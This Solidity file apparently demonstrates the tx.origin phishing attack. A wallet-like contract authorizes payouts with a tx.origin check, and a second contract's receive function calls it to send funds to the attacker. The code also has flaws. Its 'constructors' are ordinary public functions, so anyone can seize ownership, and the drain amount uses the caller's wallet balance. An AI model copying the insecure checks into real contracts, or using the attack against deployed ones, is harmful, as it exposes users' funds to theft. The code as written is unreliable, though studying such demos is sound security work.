// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

contract MyContract {

    address public owner;
    uint public balance;

    function myContract() public {
        owner = msg.sender;
        balance = address(this).balance;

    }

    function sendTo(address payable receiver, uint amount) public {
        require(tx.origin == owner,"toto");
        (bool success, ) = receiver.call{value:amount}("");
        require(success);
    }

    receive() external payable{}

}

contract AttackingContract {

    MyContract public myContract;
    address public attacker;

    function attackingContract(address payable myContractAddress) public {
        myContract = MyContract(myContractAddress);
        attacker = msg.sender;
    }

    receive() external payable{
        myContract.sendTo(payable(attacker), msg.sender.balance);
    }

}
